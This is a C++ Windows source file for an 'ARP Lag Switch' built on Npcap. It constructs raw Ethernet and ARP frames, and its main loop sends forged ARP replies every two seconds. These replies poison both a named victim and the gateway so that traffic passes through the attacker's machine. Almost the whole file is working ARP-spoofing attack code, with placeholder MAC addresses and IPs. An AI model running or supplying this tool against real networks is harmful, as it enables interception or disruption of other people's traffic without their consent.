// ARP Lag Switch.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <vector>
#include <string>
#include <unordered_set>

#include <pcap/pcap.h>
#include <Windows.h>
#include <tchar.h>

#if REG_DWORD == REG_DWORD_BIG_ENDIAN
#define HTONS(n) (n)
#define NTOHS(n) (n)
#define HTONL(n) (n)
#define NTOHL(n) (n)
#else
#define HTONS(n) (((((unsigned short)(n) & 0xFF)) << 8) | (((unsigned short)(n) & 0xFF00) >> 8))
#define NTOHS(n) (((((unsigned short)(n) & 0xFF)) << 8) | (((unsigned short)(n) & 0xFF00) >> 8))

#define HTONL(n) (((((unsigned long)(n) & 0xFF)) << 24) | \
                  ((((unsigned long)(n) & 0xFF00)) << 8) | \
                  ((((unsigned long)(n) & 0xFF0000)) >> 8) | \
                  ((((unsigned long)(n) & 0xFF000000)) >> 24))

#define NTOHL(n) (((((unsigned long)(n) & 0xFF)) << 24) | \
                  ((((unsigned long)(n) & 0xFF00)) << 8) | \
                  ((((unsigned long)(n) & 0xFF0000)) >> 8) | \
                  ((((unsigned long)(n) & 0xFF000000)) >> 24))
#endif



#define ETHERNET_TYPE_IPv4 0x0800
#define ETHERNET_TYPE_ARP 0x0806

typedef struct Ethernet_Frame_Header {
	uint8_t dest_mac[6];
	uint8_t src_mac[6];
	uint16_t ethernet_type;
} Ether_v2_Header;



#define PACKET_TYPE_ARP 0x1
#define PACKET_TYPE_IPv4 0x2

char* alloc_new_network_frame(size_t* out_header_size, int link_type, size_t frame_body_size) {
	size_t header_size = {};

	switch (link_type) {
	case DLT_EN10MB: // Ethernet IEEE 802.3
		header_size = sizeof(Ethernet_Frame_Header);
		break;
	}
	*out_header_size = header_size;

	char* frame = (char*) malloc(header_size + frame_body_size);
	if (frame == NULL) {
		fprintf(stderr, "Error allocating memory!");
		exit(1);
		return nullptr;
	}

	return frame;
}

void populate_ethernet_frame_header(
	char* frame_buffer, size_t buffer_size, int packet_type, const char dest_mac[6], const char src_mac[6]
) {
	if (buffer_size < sizeof(Ethernet_Frame_Header)) {
		fprintf(stderr, "Invalid frame size for eth header!");
		exit(1);
		return;
	}

	Ethernet_Frame_Header* frame_header = (Ethernet_Frame_Header*)frame_buffer;
	memcpy(&frame_header->dest_mac, dest_mac, sizeof(frame_header->dest_mac));
	memcpy(&frame_header->src_mac, src_mac, sizeof(frame_header->src_mac));

	// Populate ether_type
	switch (packet_type) {
	case PACKET_TYPE_ARP:
		frame_header->ethernet_type = HTONS(ETHERNET_TYPE_ARP);
		break;
	case PACKET_TYPE_IPv4:
		frame_header->ethernet_type = HTONS(ETHERNET_TYPE_IPv4);
		break;
	default:
		fprintf(stderr, "Invalid packet type!");
		exit(1);
		break;
	}
}

void populate_network_frame_header(
	char* frame_buffer, size_t buffer_size, int link_type,
	int packet_type,
	const char dest_mac[6], const char src_mac[6]
) {
	switch (link_type) {
	case DLT_EN10MB: // Ethernet IEEE 802.3
		populate_ethernet_frame_header(frame_buffer, buffer_size, packet_type, dest_mac, src_mac);
	}
}

//
#define ARP_PROTOCOL_TYPE_IPV4 0x0800
#define ARP_HARDWARE_TYPE_ETHER 1

// We don't include the dest/src mac addresses or dest/src protocol addresses because they are dynamicly sized;
typedef struct ARP_Header {
	uint16_t hardware_type;
	uint16_t protocol_type;
	uint8_t hardware_length;
	uint8_t protocol_length;
	uint16_t op;
} ARP_Header;

const size_t calculate_arp_packet_body_size(const ARP_Header* header) {
	return ((size_t)header->hardware_length) * 2 + ((size_t)header->protocol_length) * 2;
}

void populate_arp_packet(
	const char* packet_buffer,
	const size_t buffer_length,
	const ARP_Header header,
	const char* sender_hardware_address,
	const char* sender_protocol_address,
	const char* target_hardware_address,
	const char* target_protocol_address
)
{
	size_t hardware_length = header.hardware_length;
	size_t protocol_length = header.protocol_length;
	size_t bodySize = hardware_length * 2 + protocol_length * 2;

	if (buffer_length < sizeof(ARP_Header) + bodySize) {
		// Not enough buffer size for arp packet
		return;
	}

	memcpy((void*)packet_buffer, (void*)&header, sizeof(ARP_Header));

	const size_t sender_hardware_address_offset = sizeof(ARP_Header);
	const size_t sender_protocol_address_offset = sizeof(ARP_Header) + hardware_length;
	const size_t target_hardware_address_offset = sizeof(ARP_Header) + hardware_length + protocol_length;
	const size_t target_protocol_address_offset = sizeof(ARP_Header) + hardware_length * 2 + protocol_length;

	// Copy in hardware addresses and protocol addresses
	memcpy((void*)(packet_buffer + sender_hardware_address_offset), sender_hardware_address, hardware_length);
	memcpy((void*)(packet_buffer + sender_protocol_address_offset), sender_protocol_address, protocol_length);
	memcpy((void*)(packet_buffer + target_hardware_address_offset), target_hardware_address, hardware_length);
	memcpy((void*)(packet_buffer + target_protocol_address_offset), target_protocol_address, protocol_length);
}




char* create_spoofed_reply_ipv4_arp(
	size_t* out_size, int link_type,
	const char victim_mac[6], const char victim_ip[4], const char target_mac[6], const char target_ip[4]
) {
	ARP_Header header;
	ZeroMemory(&header, sizeof(ARP_Header));

	header.protocol_length = 4; // ipv4 address size
	header.hardware_length = 6; // Mac size
	header.protocol_type = HTONS(ARP_PROTOCOL_TYPE_IPV4);
	header.op = HTONS(2);

	switch (link_type) {
	case DLT_EN10MB: // Ethernet IEEE 802.3
		header.hardware_type = HTONS(ARP_HARDWARE_TYPE_ETHER);
		break;
	}


	size_t frame_body_size = sizeof(ARP_Header) + calculate_arp_packet_body_size(&header);
	size_t frame_header_size = 0;

	char* frame_buffer = alloc_new_network_frame(&frame_header_size, link_type, frame_body_size);

	size_t frame_size = frame_header_size + frame_body_size;

	populate_network_frame_header(frame_buffer, frame_size, link_type, PACKET_TYPE_ARP, victim_mac, target_mac);

	char* frame_body_buffer = ((char*)frame_buffer) + frame_header_size;
	populate_arp_packet(frame_body_buffer, frame_body_size, header, target_mac, target_ip, victim_mac, victim_ip);

	*out_size = frame_size;
	return frame_buffer;
}



BOOL load_npcap_dlls()
{
	TCHAR npcap_dir[512];
	UINT len;
	len = GetSystemDirectory(npcap_dir, 480);
	if (!len) {
		fprintf(stderr, "Error in GetSystemDirectory: %x", GetLastError());
		return FALSE;
	}

	_tcscat_s(npcap_dir, 512, TEXT("\\Npcap"));
	if (SetDllDirectory(npcap_dir) == 0) {
		fprintf(stderr, "Error in SetDllDirectory: %x", GetLastError());
		return FALSE;
	}
	return TRUE;
}

typedef struct Interface_Info {
	std::string name;
	std::string desc;
} Interface_Info;

std::string ip_to_str(const uint8_t ip[4]) {
	return std::to_string(ip[0]) + "." + std::to_string(ip[1]) + "." + std::to_string(ip[2]) + "." + std::to_string(ip[3]);
}

std::vector<Interface_Info> find_ifaces() {
	int i = 0;
	pcap_if_t* alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	/* Retrieve the device list */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	std::vector<Interface_Info> ifaces;
	for (pcap_if_t* d = alldevs; d; d = d->next) {
		Interface_Info ii{};
		ii.name = d->name;
		ii.desc = d->description;
		ifaces.push_back(std::move(ii));
	}
	pcap_freealldevs(alldevs);
	return ifaces;
}

void print_ifaces(const std::vector<Interface_Info>& ifaces) {
	int i = 0;
	for (const Interface_Info& iface : ifaces) {
		printf("%d. %s    %s\n", i, iface.desc.c_str(), iface.name.c_str());
		i++;
	}
}

typedef struct IPv4_Header {
	uint8_t ip_header_length;
	uint8_t ecn;
	uint16_t total_packet_length;
	uint16_t id;
	uint16_t frag_offset;
	uint8_t time_to_live;
	uint8_t protocol;
	uint16_t header_check_sum;
	uint32_t source_addr;
	uint32_t dest_addr;
} IPv4_Header;

// Allocates enough space for Ether_v2_Header + Data
Ether_v2_Header* alloc_eth_v2_packet(size_t data) {
	void* buffer = malloc(sizeof(Ether_v2_Header) + data);
	if (buffer == 0) {
		printf("Malloc failed!");
		exit(-1);
		return NULL;
	}
	ZeroMemory(buffer, sizeof(Ether_v2_Header) + data);
	return (Ether_v2_Header*) buffer;
}

void populate_eth_v2_packet_header(Ether_v2_Header* header, const char dest_mac[6], const char src_mac[6], const short ethernet_type) {
	memcpy(header->dest_mac, dest_mac, sizeof(header->dest_mac));
	memcpy(header->src_mac, src_mac, sizeof(header->src_mac));
	header->ethernet_type = HTONS(ethernet_type);
}

int main()
{
	if (!load_npcap_dlls()) {
		fprintf(stderr, "Failed to load Npcap DLLs!\n");
		exit(1);
	}

	const char* pcap_version = pcap_lib_version();
	printf("PCap Library version: %s\n", pcap_version);

	printf("Select Interface!\n");

	char errbuf[PCAP_ERRBUF_SIZE];
	std::vector<Interface_Info> interfaces = find_ifaces();
	print_ifaces(interfaces);

	int index;
	while (scanf_s("%d", &index) != 1);
	printf("Using \"%s\"\n", interfaces[index].desc.c_str());
	auto net_interface = interfaces[index];

	pcap_t* pcap = pcap_open(
		net_interface.name.c_str(),// name of the device
		65536,			           // snaplen
		PCAP_OPENFLAG_PROMISCUOUS, // promiscuous mode
		1000,			           // read timeout
		NULL,                      // No Auth
		errbuf			           // error buffer
	);

	if (pcap == NULL) {
		fprintf(stderr, "Unable to open the adapter. %s is not supported by WinPcap\n", net_interface.name.c_str());
		return 1;
	}

	int datalink = pcap_datalink(pcap);
	if (datalink != DLT_EN10MB)
	{
		fprintf(stderr, "This program works only on Ethernet networks.\n");
		return 1;
	}

	// TODO auto discovery of MAC addresses

	char victim_mac[] = { '\x00', '\x00', '\x00', '\x00', '\x00', '\x00' };
	char victim_ip[] = { 192, 168, 0, 123 };

	char gateway_ip[] = { 192, 168, 0, 123 };
	char gateway_mac[] = { '\x00', '\x00', '\x00', '\x00', '\x00', '\x00' };

	char our_mac[] = { '\x00', '\x00', '\x00', '\x00', '\x00', '\x00' };


	while(true) {
		// Sending packet telling our victim we are the gateway
		{
			size_t packetSize = 0;
			const u_char* packet = (const u_char*)create_spoofed_reply_ipv4_arp(&packetSize, datalink, victim_mac, victim_ip, our_mac, gateway_ip);
			if (pcap_sendpacket(pcap, packet, packetSize) != 0) {
				fprintf(stderr, "Failed to send packet 1\n");
				return 1;
			}
			free((void*) packet);
		}

		// Sending packet telling the gateway we are the victim
		{
			size_t packetSize = 0;
			const u_char* packet = (const u_char*)create_spoofed_reply_ipv4_arp(&packetSize, datalink, gateway_mac, gateway_ip, our_mac, victim_ip);
			if (pcap_sendpacket(pcap, packet, packetSize) != 0) {
				fprintf(stderr, "Failed to send packet 1\n");
				return 1;
			}
			free((void*) packet);
		}

		Sleep(2000);
	}
}
